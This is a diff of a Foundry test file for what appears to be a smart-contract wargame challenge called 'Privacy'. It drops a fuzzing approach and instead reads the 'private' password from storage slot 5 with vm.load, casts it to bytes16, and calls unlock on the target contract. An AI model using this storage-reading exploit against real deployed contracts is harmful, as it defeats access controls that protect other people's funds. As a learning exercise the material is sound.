@@ -22,14 +22,19 @@ contract PrivacyTest is Test
     }
 
     /**
-        fuzzTest on the passwork key
-     */
+        fuzzTest on the passwork key 
+
+        @notice This test is useless : fuzz stop at the first revert
+
+        It's impossible to get the passwor by brutforcing, we must read the storage
+
     function test_find_password_fuzz ( bytes16 _key ) public {
 
         _target.unlock( _key );
         console.logBytes16( _key );
         require( _target.locked() == false );
     }
+    */
 
     /**
         @notice Static array are store in contiguous slot : the size is known at 
@@ -37,20 +42,19 @@ contract PrivacyTest is Test
 
         In order to properly read private variable in storage we must use vm.load( _targert, slot ) 
         
-        @notice casting bytes takes shrink the original types and return the stronger bytes
+        @notice casting bytes shrink the original types and return the STRONGER BYTES
      */
     function test_find_password() public
     {
         bytes32 data;
 
-        data = vm.load( address( _target ), bytes32( uint256(0) ) );
-        // Bit shift the return data : I put the weakest at the strongest
-        data <<= 128;
-        console.logBytes16( bytes16(data) ); // This is not working for now because of the specific layout of Privacy Contract : variable sharing slots
+        data = vm.load( address( _target ), bytes32( uint256(5) ) );
+
+        console.logBytes16( bytes16(data) );
         console.logBytes32( data );
          _target.unlock( bytes16(data) );
   
-        require( _target.locked() == true );
+        require( _target.locked() == false );
     }
 }
 
